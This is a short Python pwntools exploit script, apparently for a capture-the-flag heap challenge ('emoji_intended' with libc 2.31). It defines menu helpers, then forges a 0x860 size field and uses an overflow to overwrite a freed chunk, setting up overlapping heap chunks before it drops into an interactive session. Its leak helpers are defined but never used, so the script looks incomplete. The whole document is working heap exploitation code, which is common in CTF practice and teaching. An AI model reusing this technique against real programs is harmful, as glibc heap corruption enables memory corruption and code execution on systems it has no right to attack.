from pwn import *
import time
elf = ELF("./emoji_intended")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary=elf
target=process([elf.path],env={"LD_PRELOAD":libc.path})
#target=remote()
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(index,size,data="A"):
	sla(": ",str(1))
	sla("Enter index: ",str(index))
	sla("Enter size: ",str(size))
	sa("Data: ",data)

def delete(index):
	sla(": ",str(2))
	sla("Enter index: ",str(index))
	
def leak(index):
	sla(": ",str(3))
	sla("Enter index: ",str(index))
	leaks=target.recvline().strip("\n")
	return leaks

def leak2(name):
	sla(": ",str(5))
	sa("Enter name:",name)
	leaks=target.recvline().strip("\n")
	return leaks

def attack(index,size,data):
	sla(": ",str(6))
	sla("Enter the index: ",str(index))
	sla("Size: ",str(size))
	sa("Here you go: ",data)

add(0,0x428)
payload="A"*0x420+p64(0x860)
add(1,0x428,payload)
add(2,0x428)
add(3,0x1f8)
delete(2)
payload="A"*0x428
attack(2,0x428,payload)
delete(0)
pause()
delete(1)
target.interactive()
